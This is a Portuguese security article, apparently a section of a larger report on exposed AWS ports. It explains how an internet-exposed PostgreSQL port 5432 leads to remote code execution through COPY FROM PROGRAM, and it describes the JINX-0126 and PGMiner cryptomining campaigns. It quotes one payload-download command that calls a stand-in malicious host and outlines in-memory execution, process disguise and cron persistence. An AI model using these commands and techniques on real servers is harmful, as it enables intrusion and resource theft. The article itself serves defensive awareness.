# Porta 5432 (PostgreSQL): Execução Remota de Código Direta e Campanhas de Cryptojacking

O PostgreSQL, configurado primariamente para escutar na porta TCP 5432, é mundialmente
reconhecido por sua arquitetura avançada, conformidade rigorosa com padrões SQL e vasto
ecossistema de extensões.<sup>4</sup> No entanto, sua formidável complexidade técnica traz consigo
funcionalidades poderosas que, se expostas a agentes maliciosos, resultam na subversão total
do host subjacente.<sup>2</sup> Ao configurar uma regra de Security Group na AWS permitindo a entrada
na porta 5432 a partir de 0.0.0.0/0, o risco imposto transcende a mera leitura de tabelas de
banco de dados; a ameaça materializa-se na execução direta e arbitrária de comandos no
sistema operacional da instância EC2.<sup>3</sup>

Um dos vetores de ataque mais severos e frequentemente abusados contra instânciasPostgreSQL armadas de forma insegura envolve a exploração de uma funcionalidade legítima
de importação de dados denominada COPY FROM PROGRAM. Introduzida nativamente na
versão 9.3 do software, esta instrução permite que o banco de dados invoque um comando de
shell do sistema operacional e direcione sua saída padrão (stdout) diretamente para preencher
os registros de uma tabela interna.<sup>6</sup> Embora os mantenedores do PostgreSQL defendam isso
como uma funcionalidade esperada baseada no modelo de confiança do superusuário
(chegando a disputar a atribuição oficial de vulnerabilidade sob o CVE-2019-9193) <sup>6</sup>, o fato
prático é inescapável: nas mãos de um atacante com acesso lógico ao banco (frequentemente
obtido via senhas fracas expostas ou por meio de arquivos pg_hba.conf mal configurados no
modo trust), essa função atua perfeitamente como uma via de Execução Remota de Código
(RCE) embutida e validada pelo sistema.<sup>3</sup>

A capacidade destrutiva da exposição descuidada da porta 5432 foi exaustivamente
evidenciada pela sofisticada campanha de cryptojacking conhecida como JINX-0126,
documentada por pesquisadores em março de 2025. Essa campanha massiva orquestrou a
infecção silenciosa e a subordinação de mais de 1.500 servidores PostgreSQL ao redor do
globo para a mineração parasitária da criptomoeda Monero (XMR).<sup>7</sup> A análise pormenorizada
da mecânica de ataque revela um grau de sofisticação cibernética que ilustra perfeitamente a
letalidade da exposição de portas <sup>35</sup>:

1. Reconhecimento e Exploração Inicial: A infraestrutura do atacante iniciou o ciclo
rastreando ativamente a internet em busca de ouvintes na porta 5432. Ao identificar
instâncias expostas, executaram ataques intensivos de força bruta utilizando usuários
padrão presumíveis (como postgres). Beneficiaram-se desproporcionalmente de
servidores onde os administradores negligenciaram o arquivo pg_hba.conf, deixando o
método de autenticação como trust, o que permitia acesso irrestrito sem qualquer
validação de credencial.<sup>3</sup>

2. Execução Fileless (Sem Arquivo) via COPY FROM PROGRAM: Uma vez autenticados
no prompt do banco de dados, os atacantes utilizaram a funcionalidade
supramencionada para injetar comandos interativos no sistema operacional. O comando
SQL típico executado assemelhava-se a: COPY FROM PROGRAM 'curl -ksS
http://malicious.server/pg_core -o pg_core'.<sup>7</sup> Através deste método, forçaram o servidor
de banco de dados a baixar clandestinamente o payload malicioso primário a partir de
um domínio de controle. Em um movimento tático brilhante de "matar a concorrência", os
scripts de shell executavam comandos agressivos para procurar e terminar
forçosamente processos de outras botnets rivais que já pudessem estar minerando na
máquina (como o malware kinsing), assegurando assim que o novo invasor tivesse
acesso exclusivo a 100% dos recursos de CPU.<sup>7</sup>

3. Evasão Avançada e Infecção em Memória: Em vez de cometer o erro tático de gravar
um binário de malware estático no disco rígido da instância—o que indubitavelmente
acionaria os alertas de ferramentas de Endpoint Detection and Response (EDR) e
scanners antivírus hospedados no disco—os atacantes orquestraram uma injeção em
memória.<sup>7</sup> Utilizaram o mecanismo avançado do Linux memfd_create para carregar e
executar o minerador diretamente na memória volátil (RAM) do host.<sup>7</sup> O processo domalware foi então fraudulentamente renomeado para postmaster (uma nomenclatura
idêntica ao do processo legítimo primário do PostgreSQL), disfarçando perfeitamente a
atividade maliciosa de administradores de sistema que porventura inspecionassem a
máquina utilizando ferramentas de diagnóstico visual como top ou ps.<sup>7</sup>

4. Estabelecimento de Persistência e Exclusão Reversa: Para garantir controle de longo
prazo, os invasores criaram novas contas de superusuário furtivas no próprio banco
(frequentemente usando a nomenclatura psql_sys) e injetaram instruções no cron job do
sistema operacional que verificavam periodicamente o estado do minerador,
reiniciando-o caso fosse interrompido.<sup>7</sup> Como manobra defensiva final, eles mesmos
alteraram o pg_hba.conf do servidor infectado para rejeitar todas as futuras conexões
externas, bloqueando efetivamente o acesso de outros atacantes. Ironicamente, esta
ação fez com que o servidor parecesse "protegido" para ferramentas de scan externas,
enquanto a botnet operava implacavelmente a partir do interior.<sup>7</sup>

O histórico sombrio do PostgreSQL aberto à internet é corroborado por outras campanhas
notórias. A botnet PGMiner, identificada pela Unidade 42, foi pioneira na utilização da
infraestrutura PostgreSQL como um canal automatizado para entrega de malware via a
vulnerabilidade disputada COPY FROM PROGRAM.<sup>6</sup> Ademais, descobertas recentes
demonstram que ameaças ao PostgreSQL podem advir de vulnerabilidades genuínas de
corrupção ou injeção no núcleo do código. A falha CVE-2025-1094 ilustra esse risco; ela
permite a execução de injeção SQL sofisticada manipulando a forma como o PostgreSQL lida
com caracteres UTF-8 inválidos na sua ferramenta interativa psql.<sup>5</sup> Um invasor habilidoso pode
explorar essa imperfeição para invocar meta-comandos de escape, como o atalho \!, que
concede instantaneamente ao atacante um shell de sistema operacional interativo com os
privilégios do serviço do banco de dados.<sup>5</sup> O tempo de comprometimento destas portas é
implacável; pesquisadores da Team Axon registraram bancos de dados PostgreSQL sendo
totalmente invadidos e extorquidos em apenas sete minutos após sua exposição à internet na
porta 5432.<sup>1</sup> Portanto, a exposição desta porta em infraestruturas AWS converte o banco de
dados em um vetor letal e autossuficiente de execução de código.

## Referências citadas

1. Protecting Postgres: Key Security Takeaways from a Postgres Honeypot - Hunters
Security, acessado em fevereiro 27, 2026,
https://www.hunters.security/en/blog/protecting-postgres

2. ​Your Database Exposure Risk | UpGuard, acessado em fevereiro 27, 2026,
https://www.upguard.com/blog/database-exposure

3. ​Exposed DB Banners: MySQL, PostgreSQL, MSSQL, MongoDB | Red Secure Tech
LTD., acessado em fevereiro 27, 2026,
https://www.redsecuretech.co.uk/blog/post/exposed-db-banners-mysql-postgre
sql-mssql-mongodb/972

4. ​Security Information - PostgreSQL, acessado em fevereiro 27, 2026,
https://www.postgresql.org/support/security/

5. ​PostgreSQL Vulnerability Exploited Alongside BeyondTrust Zero-Day in Targeted
Attacks, acessado em fevereiro 27, 2026,
https://thehackernews.com/2025/02/postgresql-vulnerability-exploited.html

6. ​PGMiner: New Cryptocurrency Mining Botnet Delivered via PostgreSQL - Unit 42,
acessado em fevereiro 27, 2026,
https://unit42.paloaltonetworks.com/pgminer-postgresql-cryptocurrency-mining
-botnet/

7. ​Proactive PostgreSQL security: What we learned from the recent cryptomining
attack, acessado em fevereiro 27, 2026,
https://www.postgresql.fastware.com/blog/proactive-postgresql-security-what-
we-learned-from-the-recent-cryptomining-attack